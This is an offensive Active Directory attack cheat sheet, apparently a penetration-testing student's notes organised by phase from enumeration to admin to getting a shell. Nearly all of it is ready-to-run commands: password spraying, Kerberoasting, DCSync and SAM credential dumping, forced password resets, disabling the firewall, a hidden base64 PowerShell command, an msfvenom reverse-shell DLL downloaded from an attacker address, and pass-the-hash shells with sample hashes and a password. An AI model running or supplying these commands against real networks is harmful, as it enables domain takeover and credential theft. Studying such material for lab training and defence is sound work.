## Enumeration Phase

#### Kerberute

- ./kerbrute userenum --dc 192.168.110.162 -d sub.poseidon.yzx '/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt'

#### Use PowerView

- Import-Module .\PowerView.ps1
- Get-NetDomain
- Get-DomainPolicy
- Get-NetDomainController
- Get-NetUser / Get-NetUser -AdminCount 1
- Get-NetGroup / Get-NetGroupMember -GroupName $groupName
- Get-NetSession
- Get-NetComputer
- Invoke-ShareFinder
- Get-NetGPO
- Get-NetUser -SPN
- Get-NetOU
- Invoke-UserHunter
- Invoke-Kerberoast
- Find-InterestingDomainAcl
- net accounts
- Get-NetUser -SPN | select samaccountname,serviceprincipalname
- Get-ObjectAcl -Identity

#### Use ldapsearch

- ldapsearch -H "ldap://192.168.189.172" -x -s base namingcontexts
- ldapsearch -H "ldap://192.168.189.172" -x -b "DC=htb,DC=local" > ldapsearch.txt
- ldapsearch -v -x -b "DC=htb,DC=local" -H "ldap://$IP" "(objectclass=\*)"
- ldapsearch -v -x -b "DC=vault,DC=offsec" -H "ldap://192.168.189.172" "(objectclass=Users)" sAMAccountName
- ldapsearch -v -x -H "ldap://192.168.157.187" -s base -b '' "(objectclass=_)" "_"
- ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.114.122" "(objectclass=\*)"

#### Use Bloodhound

- sudo neo4j start
- sudo bloodhound

#### Use SharpHound

- Import-Module .\Sharphound.ps1
- Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "FileName"

#### Check SYSVOL Share Drive

- Find-DomainShare -CheckShareAccess

## User obtained

- impacket-lookupsid $domain/$user@$machine.$domain -domain-sids
- impacket-lookupsid vault.offsec/anirudh@$vault.offsec -domain-sids
- rpcclient -U nagoya-industries/svc_helpdesk 192.168.114.21
- - rpcclient $> setuserinfo christopher.lewis 23 'PasswordHere'
- rpcclient -U fiona.clark 192.168.114.21 --password=PasswordHere --command="setuserinfo2 svc_helpdesk 23 Password123"

#### Certify

- certipy-ad find -u raven -p PasswordHere -dc-ip $Ip -stdout -vulnerable
- certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box

#### Spray the network

- nxc winrm 10.1.1.1/24 -u 'test' -p 'pass'
- nxc smb 10.1.1.0/24 -u 'user' -p 'pass' --users
- nxc smb 10.1.1.0/24 -u 'user' -p 'pass' --pass-pol
- nxc smb 10.1.1.0/24 -u 'user' -p 'pass' --shares
- nxc smb 10.1.1.1 -u /path/to/users.txt -p Password1 --continue-on-success
- nxc xmb $IP -u username -p password -X " powershell -nop -w hidden -e base64code "
- smbclient -L $ip -U userName
- smbclient -U userName //$ip/share
- Impacket-GetADUsers -all -user userName -dc-ip $ip
- crackmapexec smb $IP --pass-pol it show the threshold
- crackmapexec smb $IP -u ' ' -p ' ' --shares
- crackmapexec smb $IP -u ' ' -p ' ' --users
- crackmapexec smb 192.168.156.75 -u crackuser.txt -p 'PasswordHere' -d corp.com --continue-on-success

#### Kerberoasting

- GetUserSPNs.py -request -dc-ip $ip domain/userName
- GetNPusers.py -dc-ip $ip -request domain/ListOfUsers
- impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast domain/user
- impacket-GetUserSPNs domain/user:'password' -dc-ip $ip -debug -outputfile kerberoast.tx
- .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

## Admin obtained

- netsh advfirewall set allprofiles state off
  Mimikatz Dump
  LaZagne Dump
  Check for SAM & SYSTEM
  Check for Window.Old folder

#### BloodHound Vector Attack

##### GenericWrite

- assign SPN to target then do keberoasting
- Emily has GenericWrite over Ethan
- Ethan has DC-Sync Rights over the root domain object
- emily-->genericwrite-->ethan--->DCSYNC-->DC
- python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ethan -o ethan.kerb

##### WriteDACL

- DCsync attack
  - Need user to have 1 of these _Replicating Directory Changes_, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set*
  - Use mimikatz and run lsadump::dcsync /user:corp\user-name
  - Use impacket-secretsdump -just-dc-user dave domain/user-name:Password@dc-ip

##### GenericAll (ForceChangePassword)

- git clone https://github.com/ShutdownRepo/targetedKerberoast.git
- python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user michael -o michael.kerb
- crack hash
- Attempting to add Michael Directly to the Share Operators group:
- net rpc group addmem "share moderators" "michael" -U $domain/$user%$pass -S $box

  Changing Michaels Password:
  newPass=bl00dst1ll3r!
  net rpc password "Michael" $newPass -U $domain/$user%$pass -S $box
  netexec smb $box -u $user -p $newPass --shares

##### Get-RecoverableITEMS

- whoami /all
- it has AD recycle bin group member
- Get-RecoverableITEMS
- Get-ADObject -SearchBase “CN=Deleted Objects, DC=Cascade, DC=local” -Filter {ObjectClass -eq “user”} -IncludeDeletedObjects -Properties \*
- https://github.com/HadessCS/Awesome-Privilege-Escalation?tab=readme-ov-file#abusing-services-via-serestore

##### SeManageVolumeAbuse

- https://github.com/xct/SeManageVolumeAbuse
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.248 LPORT=4443 -f dll -o tzres.dll
- iwr -uri http://192.168.45.248/tzres.dll -Outfile tzres.dll

##### SeRestorePrivilege

- reg save hklm\system c:\Temp\system
- reg save hklm\sam c:\Temp\sam
- impacket-secretsdump -sam sam -system system local
- impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

##### SeBackupPriv

- https://github.com/giuliano108/SeBackupPrivilege/blob/master/README.md

##### SeImpersonatePrivilege

- GodPotato

##### GPOAbuse

- SharpGPOAbuse

##### GETUserSPNs

- if the user has account on DC and if anyservice running on the DC with administrator then we can use GETUserSPNs
- impacket-GetUserSPNs -request -dc-ip 10.10.86.146 oscp.exam/web-svc
- impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
- impacket-GetNPUsers $domain/ -dc-ip $box -usersfile Users.txt -format hashcat -outputfile asRepHashes.txt -no-pass
- .\Rubeus.exe asreproast /nowrap

##### DCSYNC

- impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.50.70
- impacket-secretsdump $domain/$user:$pass@$IP

##### AllExtendedRights GetChangesALL

- net rpc password "jackie" "Password2024" -U "DOMAIN"/"lisa"%"PasswordHere" -S "DomainController"
- pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
- net rpc password "jackie" "newPassword2024" -U "sub.poseidon.yzx"/"Lisa"%"PasswordHere" -S "192.168.110.162"

##### LAPS Readers

- get-adcomputer -properties \*
- Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property \*
- Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property \* -SearchBase

##### AbuseFunction : Write-UserAddMSI

- .\PowerUp.ps1
- invokeAll check

##### GMSAPasswordReader

Get-ADGroupMember 'Web Admins'

_Evil-WinRM_ PS C:\Users\enox\Desktop> Get-ADGroupMember 'Web Admins'
name : Naqi
objectClass : user
objectGUID : 82c847e5-1db7-4c00-8b06-882efb4efc6f
SamAccountName : enox

_Evil-WinRM_ PS C:\Users\enox\Desktop> Get-ADServiceAccount -Filter \* | where-object {$\_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

Enabled : True
Name : svc_apache
ObjectClass : msDS-GroupManagedServiceAccount
ObjectGUID : d40bc264-0c4e-4b86-b3b9-b775995ba303
SamAccountName : svc_apache$

- https://github.com/CsEnox/just-some-stuff
- .\GMSAPasswordReader.exe --AccountName 'svc_apache'

#### Getting A Shell

psexec

- psexec.py domain/user:Password@10.10.10.100
- psexec.py -hashes 00000000000000000000000000000000:ntlm-hash user@$ip
- psexec.py user@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

smbexec.py

- smbexec.py domain/User:Password@$ip

wmiexec.py

- wmiexec.py domain/user:Password@$ip

smbclient

- smbclient \\\\ip-address\\share-drive -U user --pw-nt-hash $ntlm-hash
